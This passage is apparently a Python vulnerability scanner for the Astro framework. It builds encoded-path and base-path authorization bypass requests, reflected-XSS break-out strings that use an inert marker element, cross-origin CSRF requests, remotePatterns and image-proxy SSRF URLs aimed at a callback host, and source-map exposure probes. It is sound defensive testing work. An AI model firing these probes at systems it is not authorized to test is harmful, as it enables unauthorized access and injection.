#!/usr/bin/env python3
"""Authorized, evidence-oriented scanner for selected Astro vulnerabilities."""

from __future__ import annotations

import argparse
import dataclasses
import datetime as dt
import hashlib
import html
import http.client
import ipaddress
import json
import random
import re
import socket
import sys
import threading
import time
import unicodedata
import urllib.parse
import uuid
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any


SUPPORTED_MODULES = (
    "fingerprint",
    "base-bypass",
    "encoded-path",
    "transition-xss",
    "transition-directive-xss",
    "spread-attrs-xss",
    "custom-element-xss",
    "hono-csrf",
    "remote-pattern-bypass",
    "slot-xss",
    "define-vars-xss",
    "dev-error-xss",
    "sourcemaps",
    "server-island-replay",
    "server-island-reflected-xss",
    "host-header-ssrf",
    "image-proxy-ssrf",
)

SENSITIVE_RESPONSE_HEADERS = {
    "set-cookie",
    "proxy-authenticate",
    "www-authenticate",
}


@dataclasses.dataclass
class Finding:
    module: str
    identifier: str
    title: str
    status: str
    confidence: str
    evidence: dict[str, Any]
    remediation: str
    references: list[str]
    limitations: list[str]


def utc_now() -> str:
    return dt.datetime.now(dt.UTC).replace(microsecond=0).isoformat().replace("+00:00", "Z")


def normalize_origin(value: str) -> str:
    parsed = urllib.parse.urlsplit(value)
    if parsed.scheme not in {"http", "https"} or not parsed.hostname:
        raise ValueError(f"Expected an http(s) origin, received: {value!r}")
    default_port = 443 if parsed.scheme == "https" else 80
    port = parsed.port if parsed.port is not None else default_port
    host = parsed.hostname.lower().rstrip(".")
    shown_port = "" if port == default_port else f":{port}"
    return f"{parsed.scheme}://{host}{shown_port}"


def is_local_hostname(hostname: str) -> bool:
    normalized = hostname.lower().rstrip(".")
    if normalized in {"localhost"} or normalized.endswith(".localhost"):
        return True
    try:
        address = ipaddress.ip_address(normalized)
    except ValueError:
        return False
    return address.is_loopback


def request_id() -> str:
    return "req-" + uuid.uuid4().hex[:12]


def sha256_bytes(value: bytes) -> str:
    return hashlib.sha256(value).hexdigest()


def safe_text(value: bytes, limit: int = 512) -> str:
    decoded = value[:limit].decode("utf-8", errors="replace")
    return "".join(char if unicodedata.category(char)[0] != "C" else " " for char in decoded)


def valid_astro_version(value: str) -> bool:
    return bool(re.fullmatch(r"\d+\.\d+\.\d+(?:[-+][0-9A-Za-z.-]+)?", value))


def add_version_evidence(
    results: list[dict[str, Any]],
    version: str,
    source: str,
    detail: str,
) -> None:
    version = version.strip().lstrip("v")
    if not valid_astro_version(version):
        return
    item = {"version": version, "source": source, "detail": detail[:240]}
    if item not in results:
        results.append(item)


def extract_astro_versions(body: bytes, response_headers: dict[str, str], artifact: str = "response-body") -> list[dict[str, Any]]:
    results: list[dict[str, Any]] = []
    text = body.decode("utf-8", errors="replace")
    generator_patterns = [
        r"""<meta\b(?=[^>]*\bname=["']generator["'])(?=[^>]*\bcontent=["']([^"']+)["'])[^>]*>""",
        r"""<meta\b(?=[^>]*\bcontent=["']([^"']+)["'])(?=[^>]*\bname=["']generator["'])[^>]*>""",
    ]
    for pattern in generator_patterns:
        for match in re.finditer(pattern, text, re.I):
            content = html.unescape(match.group(1))
            version_match = re.search(r"\bAstro\s+v?(\d+\.\d+\.\d+(?:[-+][0-9A-Za-z.-]+)?)\b", content, re.I)
            if version_match:
                add_version_evidence(results, version_match.group(1), "html-generator-meta", content)

    for header in ("x-powered-by", "server"):
        value = response_headers.get(header)
        if not value:
            continue
        version_match = re.search(r"\bAstro[/ ]?v?(\d+\.\d+\.\d+(?:[-+][0-9A-Za-z.-]+)?)\b", value, re.I)
        if version_match:
            add_version_evidence(results, version_match.group(1), f"http-header:{header}", value)

    if artifact.endswith(".json"):
        try:
            document = json.loads(text)
        except (UnicodeDecodeError, json.JSONDecodeError):
            document = None
        if isinstance(document, dict):
            if artifact.endswith("package.json"):
                for section in ("dependencies", "devDependencies", "peerDependencies"):
                    values = document.get(section)
                    if isinstance(values, dict) and isinstance(values.get("astro"), str):
                        add_version_evidence(results, values["astro"], "package.json", f"${section}.astro")
            packages = document.get("packages")
            if isinstance(packages, dict):
                for path, metadata in packages.items():
                    if isinstance(path, str) and path.rstrip("/").endswith(("node_modules/astro", "node_modules\\.astro")) and isinstance(metadata, dict) and isinstance(metadata.get("version"), str):
                        add_version_evidence(results, metadata["version"], "package-lock.json", path)

    if artifact.endswith(("package-lock.json", "pnpm-lock.yaml", "yarn.lock")):
        for match in re.finditer(r"(?im)(?:^|[\s\"'])astro[@:=\"' ]+(\d+\.\d+\.\d+(?:[-+][0-9A-Za-z.-]+)?)\b", text):
            add_version_evidence(results, match.group(1), artifact, match.group(0).strip())

    if artifact.endswith(".map") or artifact == "source-map":
        try:
            document = json.loads(text)
        except (UnicodeDecodeError, json.JSONDecodeError):
            return results
        contents = document.get("sourcesContent", []) if isinstance(document, dict) else []
        if isinstance(contents, list):
            for index, content in enumerate(contents):
                if not isinstance(content, str):
                    continue
                for match in re.finditer(r"(?i)\b(?:Astro\s+v|astro@|\"astro\"\s*:\s*\")(\d+\.\d+\.\d+(?:[-+][0-9A-Za-z.-]+)?)\b", content):
                    add_version_evidence(results, match.group(1), "source-map:sourcesContent", f"sourcesContent[{index}]")
    return results


def collect_astro_version_evidence(
    client: HTTPClient,
    target: str,
    args: argparse.Namespace,
    homepage: dict[str, Any],
) -> list[dict[str, Any]]:
    results = extract_astro_versions(homepage.get("_body", b""), homepage.get("response_headers", {}))
    body = homepage.get("_body", b"").decode("utf-8", errors="replace")
    artifact_paths = list(args.version_path)
    if args.version_probe_default_artifacts:
        artifact_paths.extend(["/package.json", "/package-lock.json", "/pnpm-lock.yaml", "/yarn.lock"])
    map_candidates = source_map_candidates(body, args.sourcemap_path, args.max_version_artifact_requests)
    requests_made = 0
    for path in artifact_paths[: max(0, args.max_version_artifact_requests - requests_made)]:
        time.sleep(args.delay)
        response = client.request("GET", join_origin_path(target, path))
        requests_made += 1
        if response.get("status") != 200:
            continue
        path_name = urllib.parse.urlsplit(path).path
        for item in extract_astro_versions(response.get("_body", b""), response.get("response_headers", {}), path_name):
            if item not in results:
                results.append(item)
    for path in map_candidates[: max(0, args.max_version_artifact_requests - requests_made)]:
        response = client.request("GET", join_origin_path(target, path))
        requests_made += 1
        if response.get("status") != 200:
            continue
        try:
            document = json.loads(response.get("_body", b""))
        except (UnicodeDecodeError, json.JSONDecodeError):
            continue
        if not isinstance(document, dict) or "sources" not in document:
            continue
        for item in extract_astro_versions(response.get("_body", b""), response.get("response_headers", {}), path):
            if item not in results:
                results.append(item)
    return results


def sanitized_headers(headers: Any) -> dict[str, str]:
    result = {}
    for name, value in headers.items():
        normalized = name.lower()
        if normalized in SENSITIVE_RESPONSE_HEADERS:
            result[normalized] = "<redacted>"
        else:
            result[normalized] = str(value)
    return result


class HTTPClient:
    def __init__(self, timeout: float, user_agent: str, extra_headers: dict[str, str] | None = None):
        self.timeout = timeout
        self.user_agent = user_agent
        self.extra_headers = dict(extra_headers or {})
        self.records: list[dict[str, Any]] = []

    def request(
        self,
        method: str,
        url: str,
        *,
        headers: dict[str, str] | None = None,
        body: bytes | None = None,
    ) -> dict[str, Any]:
        parsed = urllib.parse.urlsplit(url)
        if parsed.scheme not in {"http", "https"} or not parsed.hostname:
            raise ValueError(f"Invalid request URL: {url!r}")
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        path = parsed.path or "/"
        if parsed.query:
            path += "?" + parsed.query
        connection_headers = {"User-Agent": self.user_agent, "Accept": "*/*", **self.extra_headers}
        if headers:
            connection_headers.update({key: value for key, value in headers.items() if value is not None})

        started = time.monotonic()
        started_at = utc_now()
        connection_cls = http.client.HTTPSConnection if parsed.scheme == "https" else http.client.HTTPConnection
        connection = connection_cls(parsed.hostname, port, timeout=self.timeout)
        try:
            connection.request(method, path, body=body, headers=connection_headers)
            response = connection.getresponse()
            response_body = response.read(1024 * 1024 + 1)
            truncated = len(response_body) > 1024 * 1024
            if truncated:
                response_body = response_body[: 1024 * 1024]
            elapsed_ms = round((time.monotonic() - started) * 1000, 2)
            record = {
                "id": request_id(),
                "timestamp": started_at,
                "elapsed_ms": elapsed_ms,
                "method": method,
                "url": url,
                "request_headers": {key.lower(): value for key, value in connection_headers.items()},
                "status": response.status,
                "reason": response.reason,
                "response_headers": sanitized_headers(response.headers),
                "body_sha256": sha256_bytes(response_body),
                "body_length": len(response_body),
                "body_truncated": truncated,
                "body_preview": safe_text(response_body),
            }
            self.records.append(record)
            return {**record, "_body": response_body}
        except (OSError, http.client.HTTPException) as exc:
            elapsed_ms = round((time.monotonic() - started) * 1000, 2)
            record = {
                "id": request_id(),
                "timestamp": started_at,
                "elapsed_ms": elapsed_ms,
                "method": method,
                "url": url,
                "request_headers": {key.lower(): value for key, value in connection_headers.items()},
                "error": f"{type(exc).__name__}: {exc}",
            }
            self.records.append(record)
            return {**record, "_body": b""}
        finally:
            connection.close()


def canonical_path(path: str) -> str:
    if not path.startswith("/"):
        path = "/" + path
    path = re.sub(r"/+", "/", path)
    return path or "/"


def join_origin_path(origin: str, path: str) -> str:
    return origin.rstrip("/") + canonical_path(path)


def depth_encode_path(path: str, depth: int) -> str:
    if depth < 1:
        raise ValueError("Encoding depth must be at least 1")
    normalized = canonical_path(path)
    segments = normalized.lstrip("/").split("/", 1)
    first_segment = segments[0]
    if not first_segment or not first_segment[0].isalpha():
        raise ValueError("The first path segment must begin with an ASCII letter")
    encoded_character = f"%{ord(first_segment[0]):02x}"
    encoded_first = "%" + "25" * max(depth - 1, 0) + encoded_character[1:]
    remainder = first_segment[1:] + ("/" + segments[1] if len(segments) > 1 else "")
    return "/" + encoded_first + remainder


def marker_evidence(body: bytes, marker: str | None) -> dict[str, Any] | None:
    if not marker:
        return None
    text = body.decode("utf-8", errors="replace")
    position = text.find(marker)
    if position < 0:
        return {"present": False}
    return {
        "present": True,
        "first_index": position,
        "context": safe_text(text[max(0, position - 48) : position + len(marker) + 96].encode("utf-8")),
    }


def auth_blocked(response: dict[str, Any]) -> bool:
    return response.get("status") in {401, 403}


def protected_reached(response: dict[str, Any], marker: str | None) -> bool:
    if response.get("status") != 200 or not marker:
        return False
    return marker_evidence(response["_body"], marker)["present"]


def bypass_finding(
    module: str,
    identifier: str,
    title: str,
    baseline: dict[str, Any],
    bypass: dict[str, Any],
    marker: str | None,
    remediation: str,
    references: list[str],
) -> Finding:
    baseline_blocked = auth_blocked(baseline)
    reached = protected_reached(bypass, marker)
    if baseline_blocked and reached:
        status = "vulnerable"
        confidence = "high"
    elif baseline_blocked:
        status = "not-vulnerable-or-not-applicable"
        confidence = "medium"
    else:
        status = "inconclusive"
        confidence = "low"
    return Finding(
        module=module,
        identifier=identifier,
        title=title,
        status=status,
        confidence=confidence,
        evidence={
            "baseline_request_id": baseline["id"],
            "baseline_status": baseline.get("status", baseline.get("error")),
            "baseline_auth_blocked": baseline_blocked,
            "bypass_request_id": bypass["id"],
            "bypass_path": urllib.parse.urlsplit(bypass["url"]).path,
            "bypass_status": bypass.get("status", bypass.get("error")),
            "protected_content_marker": marker_evidence(bypass["_body"], marker) if marker else None,
        },
        remediation=remediation,
        references=references,
        limitations=[
            "A positive requires an authorization-gated baseline and a successful bypass returning the supplied protected-content marker.",
            "The check does not test every application-specific middleware pattern.",
        ],
    )


def run_fingerprint(client: HTTPClient, target: str, args: argparse.Namespace) -> Finding:
    response = client.request("GET", target + "/")
    body = response.get("_body", b"").decode("utf-8", errors="replace")
    signals = []
    for signal in [
        r"<astro-island\b",
        r"(?i)astro",
        r"/_astro/[^\"' ]+\.js",
        r'(?i)<meta[^>]+name=["\']generator["\'][^>]+astro',
    ]:
        if re.search(signal, body):
            signals.append(signal)
    powered_by = response.get("response_headers", {}).get("x-powered-by")
    if powered_by and "astro" in powered_by.lower():
        signals.append(f"x-powered-by: {powered_by}")
    version_evidence = collect_astro_version_evidence(client, target, args, response)
    version = version_evidence[0]["version"] if version_evidence else None
    exact_sources = {"html-generator-meta", "package.json", "package-lock.json", "pnpm-lock.yaml", "yarn.lock"}
    high_confidence = bool(version_evidence and any(item["source"] in exact_sources for item in version_evidence))
    return Finding(
        module="fingerprint",
        identifier="ASTRO-FINGERPRINT",
        title="Astro surface fingerprint",
        status="astro-version-identified" if version else ("astro-candidate" if signals else "no-astro-signal"),
        confidence="high" if high_confidence else ("medium" if version else "low"),
        evidence={
            "request_id": response["id"],
            "status": response.get("status", response.get("error")),
            "signals": signals,
            "astro_version": version,
            "version_evidence": version_evidence,
            "note": "A version is reported only from exact exposed metadata or build artifact; behavioral signals alone remain non-proof.",
        },
        remediation="Confirm inventory ownership for final reporting and remove public package, lock, or source-map artifacts that disclose the build version.",
        references=["https://docs.astro.build/en/recipes/upgrade-astro/"],
        limitations=["Astro sites commonly omit version metadata; absence of a version is not evidence of a fixed or vulnerable release."],
    )


def run_base_bypass(client: HTTPClient, target: str, args: argparse.Namespace) -> Finding:
    base_path = canonical_path(args.base_path)
    protected_path = canonical_path(args.protected_path)
    if base_path == "/":
        raise ValueError("CVE-2026-84376 requires a non-root base path")
    baseline_path = canonical_path(base_path + protected_path)
    suffix = args.base_bypass_suffix
    if not suffix or "/" in suffix:
        raise ValueError("Base bypass suffix must be a non-empty path-segment string")
    bypass_path = canonical_path(base_path + suffix + protected_path)
    baseline = client.request("GET", join_origin_path(target, baseline_path))
    time.sleep(args.delay)
    bypass = client.request("GET", join_origin_path(target, bypass_path))
    return bypass_finding(
        "base-bypass",
        "CVE-2026-84376 / GHSA-376h-93r7-7g6f",
        "Astro base-path middleware authorization bypass",
        baseline,
        bypass,
        args.marker,
        "Upgrade Astro to 7.2.4 or later and reject base prefixes that do not end on a path-segment boundary.",
        [
            "https://github.com/withastro/astro/security/advisories/GHSA-376h-93r7-7g6f",
            "https://github.com/withastro/astro/commit/05763a0884aabb1da78a2749d5bb9d41ae620527",
        ],
    )


def run_encoded_path(client: HTTPClient, target: str, args: argparse.Namespace) -> list[Finding]:
    baseline_path = canonical_path(args.protected_path)
    baseline = client.request("GET", join_origin_path(target, baseline_path))
    findings: list[Finding] = []
    checks = [
        ("CVE-2025-64765 / GHSA-ggxq-hp9w-j794", "Single URL-encoded middleware bypass", args.single_encoding_depth),
        ("CVE-2025-66202 / GHSA-whqg-ppgf-wp8c", "Double URL-encoded middleware bypass", 2),
        ("CVE-2026-59731 / GHSA-vj59-8hwv-xxmv", "Decode-depth middleware bypass", args.deep_encoding_depth),
    ]
    for identifier, title, depth in checks:
        time.sleep(args.delay)
        bypass = client.request("GET", join_origin_path(target, depth_encode_path(baseline_path, depth)))
        findings.append(
            bypass_finding(
                "encoded-path",
                identifier,
                f"Astro {title}",
                baseline,
                bypass,
                args.marker,
                "Upgrade to the fixed release for the applicable advisory and reject unstable or multi-level encoded paths in middleware normalization.",
                [f"https://github.com/withastro/astro/security/advisories/{identifier.split()[-1]}"],
            )
        )
    return findings


def query_url(target: str, path: str, parameter: str, payload: str) -> str:
    separator = "&" if "?" in path else "?"
    return join_origin_path(target, path) + separator + urllib.parse.urlencode({parameter: payload})


def raw_html_injection_evidence(body: bytes, token: str) -> dict[str, Any]:
    text = body.decode("utf-8", errors="replace")
    raw_marker = f"<astro-scan-xss data-token=\"{token}\"></astro-scan-xss>"
    raw_marker_pattern = re.compile(
        rf"<astro-scan-xss\b[^>]*data-token(?:%3D|=)(?:\\?\"|\\?'){re.escape(token)}[^>]*></astro-scan-xss>",
        re.IGNORECASE,
    )
    match = raw_marker_pattern.search(text)
    position = match.start() if match else -1
    encoded_forms = [
        value for value in [urllib.parse.quote(raw_marker, safe=""), html.escape(raw_marker)]
        if value and value in text
    ]
    if position >= 0:
        last_script_open = text.rfind("<script", 0, position)
        last_script_close_match = None
        for match in re.finditer(r"</script\s*>", text[:position], re.IGNORECASE):
            last_script_close_match = match
        last_script_close = last_script_close_match.end() if last_script_close_match else -1
        inside_script = last_script_open > last_script_close
        return {
            "present": not inside_script,
            "raw_marker_seen": True,
            "html_context": "script-data" if inside_script else "raw",
            "first_index": position,
            "context": safe_text(text[max(0, position - 96) : match.end() + 160].encode("utf-8")),
        }
    return {
        "present": False,
        "html_context": "escaped-or-absent",
        "encoded_or_escaped_forms_seen": encoded_forms,
    }


def xss_finding(
    module: str,
    identifier: str,
    title: str,
    response: dict[str, Any],
    token: str,
    payload: str,
    remediation: str,
    references: list[str],
) -> Finding:
    injection = raw_html_injection_evidence(response.get("_body", b""), token)
    vulnerable = injection["present"]
    return Finding(
        module=module,
        identifier=identifier,
        title=title,
        status="vulnerable" if vulnerable else "not-vulnerable-or-not-applicable",
        confidence="high" if vulnerable else "medium",
        evidence={
            "request_id": response["id"],
            "response_status": response.get("status", response.get("error")),
            "safe_payload": payload,
            "html_injection": injection,
            "proof_boundary": "The payload uses a custom inert element. Raw insertion proves the framework breakout needed for XSS; no JavaScript was executed by the scanner.",
        },
        remediation=remediation,
        references=references,
        limitations=["The application must reflect request data into the affected sink; absence of the raw marker is not version proof."],
    )


def run_transition_xss(client: HTTPClient, target: str, args: argparse.Namespace) -> Finding:
    token = uuid.uuid4().hex
    payload = f"</style><astro-scan-xss data-token=\"{token}\"></astro-scan-xss><!--"
    response = client.request("GET", query_url(target, args.transition_path, args.transition_param, payload))
    return xss_finding(
        "transition-xss",
        "CVE-2026-73422 / GHSA-4g3v-8h47-v7g6",
        "Astro View Transition animation reflected XSS",
        response,
        token,
        payload,
        "Upgrade to Astro 7.1.0 or later and never pass unvalidated request data to View Transition animation values.",
        ["https://github.com/withastro/astro/security/advisories/GHSA-4g3v-8h47-v7g6"],
    )


def run_slot_xss(client: HTTPClient, target: str, args: argparse.Namespace) -> Finding:
    token = uuid.uuid4().hex
    payload = f"astro\"></template></astro-island><astro-scan-xss data-token=\"{token}\"></astro-scan-xss><!--"
    response = client.request("GET", query_url(target, args.slot_path, args.slot_param, payload))
    return xss_finding(
        "slot-xss",
        "CVE-2026-50146 / GHSA-8hv8-536x-4wqp",
        "Astro hydrated-island slot-name reflected XSS",
        response,
        token,
        payload,
        "Upgrade to Astro 6.3.3 or later and validate or escape dynamically selected slot names before hydration.",
        ["https://github.com/withastro/astro/security/advisories/GHSA-8hv8-536x-4wqp"],
    )


def run_transition_directive_xss(client: HTTPClient, target: str, args: argparse.Namespace) -> Finding:
    token = uuid.uuid4().hex
    payload = f"\"><astro-scan-xss data-token=\"{token}\"></astro-scan-xss>"
    response = client.request(
        "GET",
        query_url(target, args.transition_directive_path, args.transition_directive_param, payload),
    )
    return xss_finding(
        "transition-directive-xss",
        "CVE-2026-59727 / GHSA-7pw4-f3q4-r2p2",
        "Astro hydrated-island transition-directive reflected XSS",
        response,
        token,
        payload,
        "Upgrade to Astro 7.0.4 or later and do not pass request-derived values to transition directives.",
        [
            "https://github.com/withastro/astro/security/advisories/GHSA-7pw4-f3q4-r2p2",
            "https://github.com/withastro/astro/commit/7ba0bb1dc7516e88caff9abd7767322af44b0294",
        ],
    )


def run_spread_attrs_xss(client: HTTPClient, target: str, args: argparse.Namespace) -> Finding:
    token = uuid.uuid4().hex
    attribute_name = f"x\"><astro-scan-xss data-token=\"{token}\"></astro-scan-xss><b y"
    payload = json.dumps({attribute_name: "astro-scan"}, separators=(",", ":"))
    response = client.request(
        "GET",
        query_url(target, args.spread_attrs_path, args.spread_attrs_param, payload),
    )
    return xss_finding(
        "spread-attrs-xss",
        "CVE-2026-54298 / GHSA-jrpj-wcv7-9fh9",
        "Astro spread attribute-name reflected XSS",
        response,
        token,
        payload,
        "Upgrade to Astro 6.4.6 or later and reject untrusted attribute names before spreading them into HTML elements.",
        ["https://github.com/withastro/astro/security/advisories/GHSA-jrpj-wcv7-9fh9"],
    )


def server_island_reflected_xss_url(target: str, component_name: str, slot_key: str, payload: str) -> str:
    slots = json.dumps({slot_key: payload}, separators=(",", ":"))
    query = urllib.parse.urlencode({"e": "file", "p": "", "s": slots})
    return join_origin_path(target, f"/_server-islands/{component_name}") + "?" + query


def run_server_island_reflected_xss(client: HTTPClient, target: str, args: argparse.Namespace) -> Finding:
    token = uuid.uuid4().hex
    payload = f"<astro-scan-xss data-token=\"{token}\"></astro-scan-xss>"
    url = server_island_reflected_xss_url(target, args.server_island_reflected_name, args.server_island_reflected_slot, payload)
    response = client.request("GET", url)
    return xss_finding(
        "server-island-reflected-xss",
        "CVE-2025-64764 / GHSA-wrwg-2hg8-v723",
        "Astro server-island arbitrary-template reflected XSS",
        response,
        token,
        payload,
        "Upgrade to Astro 5.15.8 or later and restrict or validate server-island export and slot inputs.",
        [
            "https://github.com/withastro/astro/security/advisories/GHSA-wrwg-2hg8-v723",
            "https://github.com/withastro/astro/commit/790d9425f39bbbb462f1c27615781cd965009f91",
        ],
    )


def run_custom_element_xss(client: HTTPClient, target: str, args: argparse.Namespace) -> Finding:
    token = uuid.uuid4().hex
    attribute_name = f"x\"><astro-scan-xss data-token=\"{token}\"></astro-scan-xss><b y"
    payload = json.dumps({attribute_name: "astro-scan"}, separators=(",", ":"))
    response = client.request(
        "GET",
        query_url(target, args.custom_element_path, args.custom_element_param, payload),
    )
    return xss_finding(
        "custom-element-xss",
        "CVE-2026-59729 / GHSA-f48w-9m4c-m7f5",
        "Astro custom-element attribute-name reflected XSS",
        response,
        token,
        payload,
        "Upgrade to Astro 7.0.6 or later and validate spread attribute names before passing them to HTMLElement components.",
        [
            "https://github.com/withastro/astro/security/advisories/GHSA-f48w-9m4c-m7f5",
            "https://github.com/withastro/astro/commit/5240e26c9dd91f9bc7140dcfacdb48d5a132830d",
        ],
    )


def run_hono_csrf(client: HTTPClient, target: str, args: argparse.Namespace) -> Finding:
    request_url = join_origin_path(target, canonical_path(args.hono_csrf_path))
    response = client.request(
        args.hono_csrf_method,
        request_url,
        headers={
            "Origin": args.hono_csrf_origin,
            "Content-Type": args.hono_csrf_content_type,
        },
        body=args.hono_csrf_body.encode("utf-8"),
    )
    body = response.get("_body", b"").decode("utf-8", errors="replace")
    marker_present = args.hono_csrf_marker in body
    vulnerable = response.get("status") == 200 and marker_present
    return Finding(
        module="hono-csrf",
        identifier="CVE-2026-73423 / GHSA-8mv7-9c27-98vc",
        title="Astro Hono pipeline cross-origin state change",
        status="vulnerable" if vulnerable else "not-vulnerable-or-not-applicable",
        confidence="high" if vulnerable else "medium",
        evidence={
            "request_id": response["id"],
            "request_method": args.hono_csrf_method,
            "request_path": canonical_path(args.hono_csrf_path),
            "cross_origin_header": args.hono_csrf_origin,
            "form_like_content_type": args.hono_csrf_content_type,
            "response_status": response.get("status", response.get("error")),
            "state_change_marker_present": marker_present,
            "response_context": safe_text(response.get("_body", b""), 512),
            "proof_boundary": "A 200 response containing the supplied state-change marker proves the handler executed despite the mismatched Origin header.",
        },
        remediation="Upgrade to Astro 7.0.6 or later and compose middleware() before actions() and pages() in every astro/hono pipeline.",
        references=[
            "https://github.com/withastro/astro/security/advisories/GHSA-8mv7-9c27-98vc",
            "https://github.com/withastro/astro/commit/0b30b35f864310bee8485c952d1877e82e2b9b1a",
        ],
        limitations=["Only test a harmless, explicitly configured state-changing endpoint; a 403 alone is not positive vulnerability evidence."],
    )


def remote_pattern_url(target: str, path: str, href: str) -> str:
    separator = "&" if "?" in path else "?"
    query = urllib.parse.urlencode({"href": href, "f": "svg"})
    return join_origin_path(target, canonical_path(path)) + separator + query


def image_proxy_ssrf_url(target: str, path: str, callback_url: str, image_format: str) -> str:
    parsed_callback = urllib.parse.urlsplit(callback_url)
    callback_origin = f"{parsed_callback.hostname}:{parsed_callback.port}" if parsed_callback.port else parsed_callback.hostname
    href = "\\\\" + callback_origin + parsed_callback.path
    query = urllib.parse.urlencode({"href": href, "f": image_format})
    separator = "&" if "?" in path else "?"
    return join_origin_path(target, canonical_path(path)) + separator + query


def run_remote_pattern_bypass(client: HTTPClient, target: str, args: argparse.Namespace) -> Finding:
    allowed = client.request("GET", remote_pattern_url(target, args.remote_pattern_path, args.remote_pattern_allowed_href))
    time.sleep(args.delay)
    bypass = client.request("GET", remote_pattern_url(target, args.remote_pattern_path, args.remote_pattern_bypass_href))

    def marker_evidence(response: dict[str, Any]) -> dict[str, Any]:
        body = response.get("_body", b"")
        return {
            "status": response.get("status", response.get("error")),
            "marker_present": args.remote_pattern_marker.encode("utf-8") in body,
            "request_id": response["id"],
            "response_context": safe_text(body, 384),
        }

    allowed_evidence = marker_evidence(allowed)
    bypass_evidence = marker_evidence(bypass)
    allowed_works = allowed_evidence["status"] == 200 and allowed_evidence["marker_present"]
    bypass_works = bypass_evidence["status"] == 200 and bypass_evidence["marker_present"]
    vulnerable = allowed_works and bypass_works
    return Finding(
        module="remote-pattern-bypass",
        identifier="CVE-2026-33769 / GHSA-g735-7g2w-hh3f",
        title="Astro remotePatterns wildcard path bypass",
        status="vulnerable" if vulnerable else "not-vulnerable-or-not-applicable",
        confidence="high" if vulnerable else "medium",
        evidence={
            "allowed_control": allowed_evidence,
            "bypass_attempt": bypass_evidence,
            "allowed_href": args.remote_pattern_allowed_href,
            "bypass_href": args.remote_pattern_bypass_href,
            "proof_boundary": "Both operator-controlled URLs return the marker only when the unanchored wildcard accepts a path outside the configured prefix.",
        },
        remediation="Upgrade to Astro 5.18.1 or later; wildcard remotePatterns must match only from the start of the pathname.",
        references=[
            "https://github.com/withastro/astro/security/advisories/GHSA-g735-7g2w-hh3f",
            "https://github.com/withastro/astro/commit/cf6ea6b36b67c7712395ed3f9ca19cb14ba1a013",
        ],
        limitations=["Both requested origins and resources must be operator-controlled; a 403 bypass response alone is not positive evidence."],
    )


def run_define_vars_xss(client: HTTPClient, target: str, args: argparse.Namespace) -> Finding:
    token = uuid.uuid4().hex
    payload = f"</Script><astro-scan-xss data-token=\"{token}\"></astro-scan-xss>"
    response = client.request("GET", query_url(target, args.define_vars_path, args.define_vars_param, payload))
    return xss_finding(
        "define-vars-xss",
        "CVE-2026-41067 / GHSA-j687-52p2-xcff",
        "Astro define:vars script-context reflected XSS",
        response,
        token,
        payload,
        "Upgrade to Astro 6.1.6 or later, which escapes `<` in serialized script variables.",
        ["https://github.com/withastro/astro/security/advisories/GHSA-j687-52p2-xcff"],
    )


def run_dev_error_xss(client: HTTPClient, target: str, args: argparse.Namespace) -> Finding:
    token = uuid.uuid4().hex
    raw_path = f"/\"></script><astro-scan-xss data-token=\"{token}\"></astro-scan-xss><!--"
    if args.trailing_slash_mode == "never":
        raw_path += "/"
    encoded_path = "/" + urllib.parse.quote(raw_path.lstrip("/"), safe="/:")
    response = client.request("GET", join_origin_path(target, encoded_path))
    return xss_finding(
        "dev-error-xss",
        "CVE-2025-64745 / GHSA-w2vj-39qv-7vh7",
        "Astro development-server error-page reflected XSS",
        response,
        token,
        raw_path,
        "Upgrade to Astro 5.15.6 or later and never expose development servers outside a trusted loopback environment.",
        ["https://github.com/withastro/astro/security/advisories/GHSA-w2vj-39qv-7vh7"],
    )


def source_map_candidates(body: str, explicit_paths: list[str], max_candidates: int) -> list[str]:
    candidates = [canonical_path(path) for path in explicit_paths]
    for match in re.finditer(r"""(?:src|href)=["']([^"' ]+)["']""", body, re.I):
        value = match.group(1)
        if not value.lower().endswith(".js"):
            continue
        parsed = urllib.parse.urlsplit(value)
        if parsed.scheme or parsed.netloc:
            continue
        candidate = parsed.path + ".map" if parsed.path else ""
        if candidate:
            candidates.append(canonical_path(candidate))
    result = []
    for candidate in candidates:
        if candidate not in result:
            result.append(candidate)
    return result[:max_candidates]


def run_sourcemaps(client: HTTPClient, target: str, args: argparse.Namespace) -> Finding:
    homepage = client.request("GET", target + "/")
    body = homepage.get("_body", b"").decode("utf-8", errors="replace")
    default_paths = [
        "/pages/index.astro.mjs.map",
        "/dist/server/entry.mjs.map",
        "/server/entry.mjs.map",
        "/entry.mjs.map",
    ]
    candidates = source_map_candidates(body, args.sourcemap_path + default_paths, args.max_sourcemap_requests)
    valid = []
    for path in candidates:
        time.sleep(args.delay)
        response = client.request("GET", join_origin_path(target, path))
        if response.get("status") != 200:
            continue
        content_type = response.get("response_headers", {}).get("content-type", "")
        if "json" not in content_type.lower() and not response["_body"].lstrip().startswith(b"{"):
            continue
        try:
            source_map = json.loads(response["_body"])
        except (UnicodeDecodeError, json.JSONDecodeError):
            continue
        if not isinstance(source_map, dict) or "version" not in source_map or "sources" not in source_map:
            continue
        sources = source_map.get("sources")
        source_contents = source_map.get("sourcesContent", [])
        if not isinstance(sources, list):
            continue
        valid.append(
            {
                "request_id": response["id"],
                "path": path,
                "sha256": response.get("body_sha256"),
                "source_count": len(sources),
                "source_samples": [str(item)[:240] for item in sources[:8]],
                "embedded_source_content_count": len(source_contents) if isinstance(source_contents, list) else 0,
            }
        )
        if len(valid) >= args.max_source_map_findings:
            break
    return Finding(
        module="sourcemaps",
        identifier="CVE-2024-56159 / GHSA-49w6-73cw-chjr",
        title="Astro server source maps exposed",
        status="vulnerable" if valid else "not-vulnerable-or-not-applicable",
        confidence="high" if valid else "low",
        evidence={"homepage_request_id": homepage["id"], "tested_paths": candidates, "valid_source_maps": valid},
        remediation="Upgrade to the applicable fixed Astro release, disable public source maps, and remove already published maps from caches and backups.",
        references=[
            "https://github.com/withastro/astro/security/advisories/GHSA-49w6-73cw-chjr",
            "https://github.com/withastro/astro/issues/12703",
        ],
        limitations=["A valid source map proves source disclosure, not secrets unless sourceContent itself contains them."],
    )


def server_island_params(body: str, component_name: str) -> dict[str, str] | None:
    escaped_name = re.escape(component_name)
    match = re.search(rf"""(?:src|href)=["']/_server-islands/{escaped_name}\?([^"' ]+)["']""", body, re.I)
    if not match:
        return None
    values = urllib.parse.parse_qs(match.group(1), keep_blank_values=True)
    return {key: value[0] for key, value in values.items() if value}


def server_island_replay_url(
    target: str,
    body: str,
    source_name: str,
    target_name: str,
) -> str | None:
    source = server_island_params(body, source_name)
    destination = server_island_params(body, target_name)
